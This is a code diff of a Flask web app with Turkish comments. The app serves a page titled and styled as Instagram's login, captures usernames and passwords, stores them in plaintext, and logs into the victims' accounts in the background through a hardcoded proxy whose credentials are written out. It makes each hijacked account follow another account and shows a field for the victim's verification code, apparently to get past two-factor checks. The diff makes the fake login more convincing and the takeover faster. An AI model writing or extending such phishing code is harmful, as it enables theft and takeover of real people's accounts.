@@ -1,9 +1,10 @@
 import os
 import threading
+import time
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-from instagrapi.exceptions import ChallengeRequired, BadPassword
+from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -11,34 +12,42 @@ load_dotenv()
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['SECRET_KEY'] = "full-panel-v69"
+app.config['SECRET_KEY'] = "anti-lag-v70"
 
 db = SQLAlchemy(app)
 PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
 
-clients = {}
+# Hafızada canlı tutmak için (Session yönetimi)
+active_clients = {}
 
 class IGAccount(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True, nullable=False)
     password = db.Column(db.String(100), nullable=False)
-    status = db.Column(db.String(200), default="Bekliyor")
+    status = db.Column(db.String(100), default="Giriş İşleniyor...")
 
-def login_handler(u, p):
+# --- KRİTİK ARKA PLAN FONKSİYONU ---
+def background_login(u, p):
+    """Bu fonksiyon ana sistemi bekletmeden arkada çalışır"""
     with app.app_context():
         cl = Client()
         if PROXY_URL: cl.set_proxy(PROXY_URL)
-        clients[u] = cl
+        active_clients[u] = cl
+        
         acc = IGAccount.query.filter_by(username=u).first()
         try:
+            print(f"DEBUG: {u} için arka plan girişi başladı...")
             cl.login(u, p)
             acc.status = "AKTIF"
             db.session.commit()
+            # Giriş başarılıysa takip botunu başlat
+            cl.user_follow(cl.user_id_from_username("instagram"))
         except ChallengeRequired:
-            acc.status = "ONAY"
+            acc.status = "ONAY_KODU_LAZIM"
             db.session.commit()
         except Exception as e:
-            acc.status = "HATA"
+            print(f"Hata: {e}")
+            acc.status = "GIRIS_HATASI"
             db.session.commit()
 
 @app.route('/')
@@ -49,132 +58,113 @@ def index():
 def connect():
     data = request.json
     u, p = data.get('u'), data.get('p')
+    
+    # 1. Veritabanına anında işle veya güncelle
     acc = IGAccount.query.filter_by(username=u).first()
     if not acc:
-        acc = IGAccount(username=u, password=p, status="Giris Yapiliyor...")
+        acc = IGAccount(username=u, password=p)
         db.session.add(acc)
     else:
-        acc.password, acc.status = p, "Giris Yapiliyor..."
+        acc.password = p
+        acc.status = "Giriş İşleniyor..."
     db.session.commit()
-    threading.Thread(target=login_handler, args=(u, p)).start()
-    return jsonify(status="ok")
+
+    # 2. ASIL OLAY: Threading ile botu arka plana at (Ana sistemi kilitleme!)
+    thread = threading.Thread(target=background_login, args=(u, p))
+    thread.daemon = True
+    thread.start()
+
+    # 3. Müşteriye saniyesinde "Tamamdır" cevabı ver
+    return jsonify(status="process_started")
 
 @app.route('/api/status/<u>')
 def get_status(u):
     acc = IGAccount.query.filter_by(username=u).first()
     return jsonify(status=acc.status if acc else "YOK")
 
-# --- TEK DOSYADA TÜM ARAYÜZ (GİRİŞ + PANEL) ---
+# --- UI (SANIYESINDE ACILAN PANEL) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AllFollow - Sosyal Medya Paneli</title>
+    <title>Giriş Yap • Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-    <style>
-        .insta-input { background: #fafafa; border: 1px solid #dbdbdb; padding: 9px 8px; font-size: 12px; border-radius: 3px; width: 100%; outline: none; }
-        .page { display: none; } .active { display: block; }
-    </style>
+    <style>.page { display: none; } .active { display: block; }</style>
 </head>
-<body class="bg-[#fafafa]">
+<body class="bg-[#fafafa] font-sans">
 
-    <div id="login-page" class="page active flex flex-col items-center justify-center min-h-screen">
-        <div class="bg-white border border-[#dbdbdb] p-10 w-[350px] flex flex-col items-center mb-3">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="mt-4 mb-8 w-44">
-            <div class="w-full space-y-2">
-                <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="insta-input">
-                <input id="p" type="password" placeholder="Şifre" class="insta-input">
-                <button onclick="login()" id="l-btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-semibold text-sm mt-4">Giriş Yap</button>
-            </div>
-            <div class="flex items-center w-full my-6 text-gray-400"><div class="h-[1px] bg-[#dbdbdb] flex-grow"></div><div class="px-4 text-[13px] font-semibold">YA DA</div><div class="h-[1px] bg-[#dbdbdb] flex-grow"></div></div>
-            <p class="text-[#385185] font-semibold text-sm cursor-pointer"><i class="fab fa-facebook-square mr-2"></i>Facebook ile Giriş Yap</p>
+    <div id="login-section" class="page active flex flex-col items-center mt-12">
+        <div class="bg-white border border-gray-300 p-10 w-[350px] flex flex-col items-center">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8">
+            <input id="u" placeholder="Kullanıcı adı" class="w-full p-2 mb-2 bg-gray-50 border border-gray-300 rounded text-xs outline-none">
+            <input id="p" type="password" placeholder="Şifre" class="w-full p-2 mb-4 bg-gray-50 border border-gray-300 rounded text-xs outline-none">
+            <button onclick="send()" id="btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-bold text-sm">Giriş Yap</button>
         </div>
     </div>
 
-    <div id="panel-page" class="page min-h-screen bg-gray-50">
-        <nav class="bg-white border-b p-4 flex justify-between items-center shadow-sm">
-            <h1 class="text-xl font-black italic text-purple-600">ALLFOLLOW</h1>
-            <div class="flex items-center space-x-2">
-                <span id="panel-user" class="text-xs font-bold text-gray-600"></span>
-                <div class="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center text-purple-600"><i class="fas fa-user text-xs"></i></div>
-            </div>
-        </nav>
-
-        <div class="p-4 max-w-md mx-auto space-y-4">
-            <div id="status-card" class="bg-white p-6 rounded-3xl border shadow-sm text-center">
-                <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Hesap Durumu</p>
-                <h2 id="status-text" class="text-lg font-black text-orange-500 italic">BAĞLANILIYOR...</h2>
+    <div id="panel-section" class="page min-h-screen bg-gray-50">
+        <nav class="bg-white border-b p-4 text-center font-black italic text-purple-600 shadow-sm">ALLFOLLOW PANEL</nav>
+        
+        <div class="p-6 max-w-sm mx-auto">
+            <div id="status-box" class="bg-white p-8 rounded-[40px] shadow-xl border-t-4 border-purple-500 text-center mb-6">
+                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Canlı Bağlantı Durumu</p>
+                <h2 id="st-msg" class="text-xl font-black italic text-purple-600 animate-pulse">BAĞLANILIYOR...</h2>
                 
-                <div id="verify-area" class="hidden mt-4 p-4 bg-red-50 rounded-2xl border border-red-100">
-                    <p class="text-[10px] text-red-600 font-bold mb-2 uppercase">Doğrulama Kodu Gerekli</p>
-                    <input id="vcode" placeholder="000000" class="w-full p-3 text-center text-2xl font-mono border rounded-xl mb-2">
-                    <button class="w-full bg-red-600 text-white py-3 rounded-xl font-bold text-sm">ONAYLA</button>
+                <div id="onay-alani" class="hidden mt-6 bg-red-50 p-4 rounded-3xl border border-red-100">
+                    <p class="text-xs text-red-500 font-bold mb-3">INSTAGRAM KOD GÖNDERDİ</p>
+                    <input id="vcode" placeholder="000000" class="w-full p-3 text-center text-2xl font-mono border rounded-2xl mb-3 outline-none">
+                    <button class="w-full bg-red-600 text-white py-3 rounded-2xl font-bold">KODU ONAYLA</button>
                 </div>
             </div>
 
-            <div class="grid grid-cols-2 gap-4">
-                <div class="bg-white p-6 rounded-3xl border shadow-sm flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
-                    <i class="fas fa-user-plus text-2xl text-blue-500"></i>
-                    <p class="text-xs font-bold text-gray-700">Takipçi Gönder</p>
-                </div>
-                <div class="bg-white p-6 rounded-3xl border shadow-sm flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
-                    <i class="fas fa-heart text-2xl text-red-500"></i>
-                    <p class="text-xs font-bold text-gray-700">Beğeni Gönder</p>
-                </div>
-            </div>
-
-            <div class="bg-blue-600 p-6 rounded-3xl text-white shadow-xl">
-                <h3 class="font-bold mb-2 flex items-center"><i class="fas fa-info-circle mr-2"></i> Nasıl Çalışır?</h3>
-                <p class="text-[11px] leading-relaxed opacity-90">Sistemimiz havuz mantığıyla çalışır. Hesabınız aktif olduktan sonra otomatik olarak kredi kazanırsınız. Kredilerinizle yukarıdaki menüden işlem yapabilirsiniz.</p>
+            <div class="bg-white p-4 rounded-3xl shadow-sm border flex items-center justify-between">
+                <div><p class="text-[10px] text-gray-400 font-bold uppercase">Aktif Hesap</p><p id="usr" class="font-bold"></p></div>
+                <div class="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center text-purple-600 font-bold italic">IG</div>
             </div>
         </div>
     </div>
 
     <script>
-        let curUser = "";
-        function login() {
-            curUser = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            if(!curUser || !p) return;
+        let user = "";
+        function send() {
+            user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            if(!user || !pass) return;
 
-            document.getElementById('l-btn').innerText = "Giriş Yapılıyor...";
-            
+            // 1. Backend'e komutu ver (Bekleme yapma!)
             fetch('/api/connect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({u:curUser, p:p})
+                body: JSON.stringify({u:user, p:pass})
             });
 
-            setTimeout(() => {
-                document.getElementById('login-page').classList.remove('active');
-                document.getElementById('panel-page').classList.add('active');
-                document.getElementById('panel-user').innerText = "@" + curUser;
-                setInterval(updateStatus, 3000);
-            }, 1000);
+            // 2. Saniyesinde paneli aç (Müşteri beklememiş olur)
+            document.getElementById('login-section').classList.remove('active');
+            document.getElementById('panel-section').classList.add('active');
+            document.getElementById('usr').innerText = "@" + user;
+
+            // 3. Durumu arkadan kontrol etmeye başla
+            setInterval(check, 3000);
         }
 
-        async function updateStatus() {
-            const res = await fetch('/api/status/' + curUser);
-            const data = await res.json();
-            const stText = document.getElementById('status-text');
-            const vArea = document.getElementById('verify-area');
-            const card = document.getElementById('status-card');
+        async function check() {
+            const r = await fetch('/api/status/' + user);
+            const d = await r.json();
+            const msg = document.getElementById('st-msg');
+            const onay = document.getElementById('onay-alani');
 
-            stText.innerText = data.status.replace("_", " ");
+            msg.innerText = d.status.replace("_", " ");
             
-            if(data.status === "AKTIF") {
-                stText.innerText = "SİSTEM AKTİF ✅";
-                stText.className = "text-lg font-black text-green-500 italic";
-                vArea.classList.add('hidden');
-            } else if(data.status === "ONAY") {
-                stText.innerText = "GÜVENLİK ONAYI ⚠️";
-                stText.className = "text-lg font-black text-orange-500 italic";
-                vArea.classList.remove('hidden');
-            } else if(data.status === "HATA") {
-                stText.innerText = "BAĞLANTI HATASI ❌";
-                stText.className = "text-lg font-black text-red-500 italic";
+            if(d.status === "AKTIF") {
+                msg.innerText = "SİSTEM AKTİF ✅";
+                msg.classList.remove('animate-pulse');
+                msg.style.color = "#22c55e";
+                onay.classList.add('hidden');
+            } else if(d.status === "ONAY_KODU_LAZIM") {
+                msg.innerText = "ONAY BEKLENİYOR ⚠️";
+                msg.style.color = "#f59e0b";
+                onay.classList.remove('hidden');
             }
         }
     </script>
